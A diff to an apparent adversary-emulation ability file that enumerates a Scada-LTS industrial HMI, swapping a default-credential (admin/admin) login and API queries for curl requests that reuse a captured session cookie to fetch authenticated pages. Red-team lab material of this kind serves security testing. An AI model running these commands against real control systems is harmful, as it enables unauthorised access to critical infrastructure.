@@ -2,7 +2,9 @@
 
 - id: a7b8c9d0-7777-7777-7777-000000000001
   name: SCADA-LTS - API Data Source Enumeration
-  description: Enumerate data sources and points via SCADA-LTS API
+  description: |
+    Stock Scada-LTS does not expose /api/datasources at root. Fetches authenticated HTML
+    pages (data_sources.shtm, events.shtm). Requires HMI login ability first (/tmp/hmi_cookies.txt).
   tactic: execution
   technique_id: T0871
   technique_name: Execution through API
@@ -10,17 +12,11 @@
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080" &&
-      curl -s -c /tmp/hmi.jar
-      -d "username=admin&password=admin"
-      "$HMI/login.htm" -o /dev/null &&
-      echo "=== Data Sources ===" &&
-      curl -s -b /tmp/hmi.jar "$HMI/api/datasources" 2>/dev/null &&
-      echo "" &&
-      echo "=== Data Points ===" &&
-      curl -s -b /tmp/hmi.jar "$HMI/api/datapoints" 2>/dev/null &&
-      echo "" &&
-      echo "=== Views ===" &&
-      curl -s -b /tmp/hmi.jar "$HMI/api/views" 2>/dev/null &&
-      echo "ENUMERATION_COMPLETE"
-    timeout: 30
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/data_sources.shtm" -o /tmp/hmi_ds.html &&
+      echo "=== data_sources.shtm (lines) ===" &&
+      wc -l /tmp/hmi_ds.html &&
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/events.shtm" -o /tmp/hmi_ev.html &&
+      echo "=== events.shtm (lines) ===" &&
+      wc -l /tmp/hmi_ev.html &&
+      echo "HMI_ENUMERATION_COMPLETE"
+    timeout: 60
